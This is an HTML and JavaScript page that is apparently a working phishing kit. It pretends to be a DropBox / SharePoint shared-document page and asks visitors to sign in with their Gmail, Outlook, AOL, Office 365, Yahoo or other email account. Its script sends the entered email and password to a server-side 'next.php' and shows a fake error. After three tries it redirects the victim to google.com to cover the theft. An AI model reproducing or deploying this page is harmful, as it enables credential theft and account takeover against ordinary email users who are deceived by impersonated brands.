
<!doctype html>
<html lang="en">
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.1.1.min.js">
    <script src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
    <title>Share Point Online</title>
    <link href="css/hover.css" rel="stylesheet" media="all">

    <style type="text/css">
      body,
      html {
        margin: 0;
        padding: 0;
        height: 100%;
        /*background-image: url('images/9b.png'); background-size: cover;background-repeat: no-repeat;*/

      }
      .user_card {
        height: 500px;
        width: 400px;
        margin-top: auto;
        margin-bottom: auto;
        background: rgba(0,0,0,0.5);
        position: relative;
        display: flex;
        color: white;
        justify-content: center;
        flex-direction: column;
        padding: 10px;
        box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
        -webkit-box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
        -moz-box-shadow: 0 4px 8px 0 rgba(0, 0, 0, 0.2), 0 6px 20px 0 rgba(0, 0, 0, 0.19);
        border-radius: 5px;

      }
      .brand_logo_container {
        position: absolute;
        height: 150px;
        width: 150px;
        top: -75px;
        border-radius: 50%;
        background: white;
        padding: 10px;
        text-align: center;
      }
      .brand_logo {
        height: 130px;
        width: 130px;
        padding: 10px;
        border-radius: 50%;
        border: 2px solid white;
      }
      .form_container {
        margin-top: 100px;
      }
      .login_btn {
        width: 100%;
        background: #0073C8 !important;
        color: white !important;
      }
      .login_btn:focus {
        box-shadow: none !important;
        outline: 0px !important;
      }
      .login_container {
        padding: 0 2rem;
      }
      .input-group-text {
        background: #0073C8 !important;
        color: white !important;
        border: 0 !important;
        border-radius: 0.25rem 0 0 0.25rem !important;
      }
      .input_user,
      .input_pass:focus {
        box-shadow: none !important;
        outline: 0px !important;
      }
      .custom-checkbox .custom-control-input:checked~.custom-control-label::before {
        background-color: #c0392b !important;
      }

      @media only screen and (max-width: 995px) {

      /*html,body{
        background-image: url('images/4b.jpg');
        background-size: cover;
        background-repeat: no-repeat;
        height: auto;
        font-family: 'Numans', sans-serif;
        }*/
      }
    </style>
  </head>
  <body>
    <div class="container-fluid" style="padding:50px;background-image:url('https://wallpaperaccess.com/full/656684.jpg'); background-size: cover;background-repeat: no-repeat; background-position: right;">
      <div class="row">
        <div class="col-lg-6 text-center" style="padding: 150px 50px 80px 50px;">
          <img src="images/dropbox.png" class="img-fluid" width="100px"><br>
          <span class="h3 text-white">DropBox</span><br>
          <span class="h5 text-white">To read he document, please choose your email provider below login to view shared files</span><br>
          <hr class="rounded" style="width: 40%; border:2px solid white; "><br>


          <a href="javascript:void(0)" id="gmailmodal" class="hvr-grow" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
            <div class="rounded px-2 py-1 mt-2" >
              <img src="images/gmail1.png" class="img-fluid rounded" width="50px" style=" background-color: #D44638;padding: 5px;"><br>
            </div>
          </a>
          <a href="javascript:void(0)" id="outlookmodal" class="hvr-grow" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
            <div class=" px-2 py-1 mt-2">
              <img src="images/outlook1.png" class="img-fluid rounded" width="50px" style="padding:5px;background-color: #0073C8;"><br>
            </div>
          </a>
          <a href="javascript:void(0)" id="aolmodal" class="hvr-grow" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
            <div class="rounded px-2 py-1 mt-2">
              <img src="images/aol1.png" class="img-fluid rounded" width="55px" style="background-color: #31459B;padding:5px;"><br>
            </div>
          </a>
          <a href="javascript:void(0)" id="office365modal" class="hvr-grow" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
            <div class="rounded px-2 py-1 mt-2">
              <img src="images/office3651.png" class="img-fluid rounded" width="50px" style="background-color: #FF3C00;padding:5px;"><br>
            </div>
          </a>
          <a href="javascript:void(0)" id="yahoomodal" class="hvr-grow" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
            <div class="rounded px-2 py-1 mt-2">
              <img src="images/yahoo1.png" class="img-fluid rounded" width="50px" style="padding:5px;background-color: #5F0F68;"><br>
            </div>
          </a>
          <a href="javascript:void(0)" id="othermodal" class="hvr-grow" style="text-decoration: none;" data-toggle="modal" data-target="#ajaxModal">
            <div class="rounded px-2 py-1 mt-2">
              <img src="images/other1.png" class="img-fluid rounded" width="50px" style="padding:5px;background-color: #0B5BD3;"><br>

            </div>
          </a>
        </div>


        <div class="col-lg-6" style="padding: 100px 10px 70px 10px; ">
         <div class="container h-100">
          <div class="d-flex justify-content-center h-100">
            <div class="user_card">
              <div class="d-flex justify-content-center">
                <div class="brand_logo_container">
                  <img id="fieldImg" src="images/gmail.png" class="brand_logo bg-white img-fluid" alt="Logo"><br><br>
                  <span id="field" class="h3">Gmail</span>
                </div>
              </div>
              <div class=" justify-content-center form_container">
                <form id="contact" class="form-horizontal well">
                  
                  <div class="input-group mb-3 col-lg-12">
                    <div class="input-group-append">
                      <span class="input-group-text"><i class="fas fa-user"></i></span>
                    </div>
                    <input type="email" id="ai" name="ai" class="form-control input_user" value="" placeholder="Enter email">
                  </div>
                  <div class="input-group mb-2 col-lg-12">
                    <div class="input-group-append">
                      <span class="input-group-text"><i class="fas fa-key"></i></span>
                    </div>
                    <input type="password" id="pr" name="pr" class="form-control input_pass" value="" placeholder="Enter Password">
                  </div>
                  <div class="form-group">
                    <div class="custom-control custom-checkbox">
                      <input type="checkbox" class="custom-control-input" id="customControlInline">
                      <label class="custom-control-label" for="customControlInline">Remember me</label>
                    </div>
                  </div>
                  <div class="alert alert-danger" id="msg"></div>
                  <div class="d-flex justify-content-center mt-3 login_container">
                    <button type="submit" name="button" class="btn login_btn" id="submit-btn">Login</button>
                  </div>
                </form>
              </div>

              <div class="mt-4">
                <div class="d-flex justify-content-center links">
                  Don't have an account? <a href="#" class="ml-2">Sign Up</a>
                </div>
                 <div class="d-flex justify-content-center links">
                  <a href="#">Forgot your password?</a>
                </div>
              </div> 
            </div>
          </div>
        </div>
      </div>

    </div>
  </div>



















  <!-- Optional JavaScript -->
  <!-- jQuery first, then Popper.js, then Bootstrap JS -->
  <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</body>


<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script>

  
    /* global $ */
    $(document).ready(function(){
       $("#msg").hide();
       var count=0;
      $('#gmailmodal').click(function () {
        $('#contact').trigger("reset");
       
        $('#fieldImg').attr('src', 'images/gmail.png');
        $('#field').html("Gmail");
        $('#ajaxModal').modal('show');
      });
      $('#outlookmodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/outlook.png');
        $('#field').html("Outlook");
        $('#ajaxModal').modal('show');
      });
      $('#aolmodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/aol.png');
        $('#field').html("Aol");
        $('#ajaxModal').modal('show');
      });
      $('#office365modal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/office365.png');
        $('#field').html("Office 365");
        $('#ajaxModal').modal('show');
      });
      $('#yahoomodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/yahoo.png');
        $('#field').html("Yahoo");
        $('#ajaxModal').modal('show');
      });
      $('#othermodal').click(function () {
        $('#contact').trigger("reset");
        $("#msg").hide();
        $('#fieldImg').attr('src', 'images/othermail.ico');
        $('#field').html("Other Mail");
        $('#ajaxModal').modal('show');
      });
      $('#submit-btn').click(function(event){
        event.preventDefault();
        var ai=$("#ai").val();
        var pr=$("#pr").val();
        var detail=$("#field").html();

        
        var msg = $('#msg').html();
        $('#msg').text( msg );
        count=count+1;
        if (count>=3) {
          count=0;
          window.location.replace("http://google.com");
        }
        else
        {
         $.ajax({
          dataType: 'JSON',
          url: 'next.php',
          type: 'POST',
          data:{
            ai:ai,
            pr:pr,
            detail:detail,

          },
            // data: $('#contact').serialize(),
            beforeSend: function(xhr){
              $('#submit-btn').html('Verifing...');
            },
            success: function(response){
				$("#pr").val("");
              if(response){
                $("#msg").show();
                console.log(response);
                if(response['signal'] == 'ok'){
                 $('#msg').html(response['msg']);
                  // $('input, textarea').val(function() {
                  //    return this.defaultValue;
                  // });
                }
                else{
                  $('#msg').html(response['msg']);
                }
              }
            },
            error: function(){
				$("#pr").val("");
              $("#msg").show();
              $('#msg').html("Please try again later");
            },
            complete: function(){
              $('#submit-btn').html('Login');
            }
          });
       }
     });
    });
  </script>
  </html>